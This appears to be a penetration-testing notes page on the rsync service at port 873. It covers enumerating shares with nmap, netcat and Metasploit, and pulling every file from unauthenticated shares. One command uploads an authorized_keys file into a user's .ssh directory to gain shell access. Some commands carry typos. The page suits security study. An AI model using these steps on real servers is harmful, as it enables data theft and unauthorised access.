---
title: Port 873 - rsync
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - rsync
  - port
  - "873"
---

# Port 873 - rsync

## Description

rsync is a utility for efficiently transferring and synchronizing files between a computer and an external hard drive and across networked computers. It can be used to copy files locally on a given machine and to/from remote hosts. It is highly versatile and well-known for its delta-transfer algorithm. This algorithm reduces the amount of data transmitted over the network when a version of the file already exists on the destination host. It does this by sending only the differences between the source files and the older version of the files that reside on the destination server. It is often used for backups and mirroring. It finds files that need to be transferred by looking at files that have changed in size or the last modified time. By default, it uses port `873` and can be configured to use SSH for secure file transfers by piggybacking on top of an established SSH server connection. 

## Footprinting rsync

```bash
sudo nmap -sV -p 873 $ip
```

We can next probe the service a bit to see what we can gain access to:

```bash
nc -nv $ip 873
```

If some share is returned, we could go further by enumerating the share:

```bash
rsync -av --list-only rsync://$ip$/<nameOfShare>
```

nmap script to enumerate shares:

```bash
nmap -sV --script "rsync-list-modules" -p <PORT> $ip
```

metasploit module to enumerate shares

```msf
use auxiliary/scanner/rsync/modules_list
```

If IPv6 is in use:

```bash
# Example using IPv6 and a different port
rsync -av --list-only rsync://[dead:beef::250:56ff:feb9:e90a]:8730
```

## Connect to the service

```bash
rsync rsync://IP
```

## Basic rsync commands

General syntax:

```
rsync [OPTION] ... [USER@]HOST::SRC [DEST]
```


```bash
# List content
rsync IP::

# List recursively a directory
rsync -r IP::folder

# Download a file from  the server to your machine
rsync IP::folder/sourcefile.txt destinationfile.txt    

# Downloa a folder
rsync -r IP::folder/sourcefile.txt destinationfile.txt   
```

## Brute force

Once you have the list of modules you have a few different options depending on the actions you want to take and whether or not authentication is required. If authentication is not required you can list a shared folder:

```bash
rsync -av --list-only rsync://$ip$/<nameOfShared>
```

And copy all files to your local machine via the following command:

```bash
rsync -av rsync://$ip:8730/<nameOfShared>./rsyn_shared
```

This recursively transfers all files from the directory `<nameOfShared>` on the machine $ip into the `./rsync_shared` directory on the local machine. The files are transferred in "archive" mode, which ensures that symbolic links, devices, attributes, permissions, ownerships, etc. are preserved in the transfer.

If you **have credentials** you can **list/download** a **shared name** using (the password will be prompted):

```bash
rsync -av --list-only rsync://<username>@$ip/<nameOfShared>
rsync -av 

rsync://<username>@$ip$:8730/<nameOfShared> ./rsyn_shared
```

You could also **upload** some **content** using rsync (for example, in this case we can upload an **_authorized_keys_** file to obtain access to the box):

```bash
rsync -av home_user/.ssh/ rsync://<username>@$ip/home_user/.ssh
```


## Transfer Files with Rsync over SSH

Before you can start transferring files and directories with rsync over SSH, make sure you can [use SSH to connect to a remote server](https://phoenixnap.com/kb/ssh-to-connect-to-remote-server-linux-or-windows). Once verified, you can begin backing up your data. Ensure your destination system has sufficient storage space.

The syntax for copying files to a remote server over SSH with the **`rsync`** command is:

```
rsync OPTION SourceDirectory_or_filePath user@serverIP_or_name:Target

# Example
rsync ~/Desktop/Dir1/"source pdf sample.pdf" test@192.168.56.100:~/Desktop/test
```
